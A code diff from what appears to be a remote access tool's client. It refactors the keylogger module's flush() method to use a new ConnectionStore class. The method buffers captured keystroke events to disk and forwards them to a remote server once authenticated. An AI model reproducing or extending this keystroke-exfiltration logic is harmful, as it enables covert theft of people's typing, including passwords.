@@ -29,7 +29,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.Client;
-import com.subterranean_security.crimson.client.ClientStore;
+import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.core.misc.MemList;
 import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
@@ -181,16 +181,16 @@ public final class Keylogger {
 	 * storage
 	 */
 	public static synchronized void flush() {
-		if (ClientStore.Connections.getServerConnectionState() != ConnectionState.AUTHENTICATED) {
+		if (ConnectionStore.getServerConnectionState() != ConnectionState.AUTHENTICATED) {
 			while (buffer.size() > 0) {
 				diskBuffer.add(buffer.remove(0));
 			}
 		} else {
 			while (diskBuffer.size() > 0) {
-				ClientStore.Connections.route(Message.newBuilder().setEvKevent(diskBuffer.remove(0)));
+				ConnectionStore.route(Message.newBuilder().setEvKevent(diskBuffer.remove(0)));
 			}
 			while (buffer.size() > 0) {
-				ClientStore.Connections.route(Message.newBuilder().setEvKevent(buffer.remove(0)));
+				ConnectionStore.route(Message.newBuilder().setEvKevent(buffer.remove(0)));
 			}
 		}
 
